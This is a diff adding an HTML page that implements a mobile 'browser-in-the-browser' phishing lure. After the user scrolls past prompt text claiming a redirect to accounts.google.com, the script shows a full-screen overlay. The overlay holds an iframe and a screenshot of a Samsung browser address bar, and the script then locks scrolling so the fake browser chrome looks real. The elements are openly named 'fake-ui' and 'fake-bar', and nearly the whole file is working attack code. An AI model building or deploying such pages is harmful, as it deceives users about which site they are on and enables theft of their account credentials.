@@ -1,0 +1,151 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>main pagee</title>
+    <style>
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        height: 200vh;
+        background-color: #ffffff;
+        font-family: -apple-system, Roboto, sans-serif;
+        scroll-behavior: smooth;
+      }
+
+      #scroll-bait {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        text-align: center;
+        color: #3c4043;
+        padding: 30px;
+        box-sizing: border-box;
+      }
+
+      .icon-circle {
+        width: 64px;
+        height: 64px;
+        background: #f1f3f4;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 20px;
+      }
+
+      h2 {
+        font-weight: 400;
+        font-size: 22px;
+        margin-bottom: 10px;
+      }
+      p {
+        font-size: 14px;
+        line-height: 1.6;
+        color: #5f6368;
+      }
+
+      .arrow {
+        margin-top: 40px;
+        font-size: 24px;
+        animation: slideDown 1.5s infinite;
+      }
+      @keyframes slideDown {
+        0% {
+          transform: translateY(0);
+          opacity: 0;
+        }
+        50% {
+          opacity: 1;
+        }
+        100% {
+          transform: translateY(20px);
+          opacity: 0;
+        }
+      }
+
+      #fake-ui {
+        display: none;
+        flex-direction: column;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        z-index: 9999;
+        background: #fff;
+      }
+
+      #fake-content {
+        width: 100%;
+        flex-grow: 1;
+        border: none;
+        display: block;
+      }
+
+      #fake-bar {
+        width: 100%;
+        height: auto;
+        display: block;
+        flex-shrink: 0;
+        border-top: 1px solid #333;
+        background-color: #242435;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="scroll-bait">
+      <div class="icon-circle">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="#4285F4">
+          <path
+            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
+          />
+        </svg>
+      </div>
+      <h2>scroll down to redirect to accounts.google.com</h2>
+      <div class="arrow">↓</div>
+    </div>
+
+    <div id="fake-ui">
+      <iframe id="fake-content" src="2.html"></iframe>
+      <img id="fake-bar" src="samsung.PNG" alt="Address Bar" />
+    </div>
+
+    <script>
+      let active = false;
+
+      window.addEventListener(
+        "scroll",
+        () => {
+          if (window.scrollY > 60 && !active) {
+            active = true;
+
+            document.getElementById("fake-ui").style.display = "flex";
+
+            document.body.style.overflow = "hidden";
+            document.documentElement.style.overflow = "hidden";
+          }
+        },
+        { passive: true },
+      );
+
+      document.addEventListener(
+        "touchmove",
+        (e) => {
+          if (active) {
+            e.preventDefault();
+          }
+        },
+        { passive: false },
+      );
+    </script>
+  </body>
+</html>
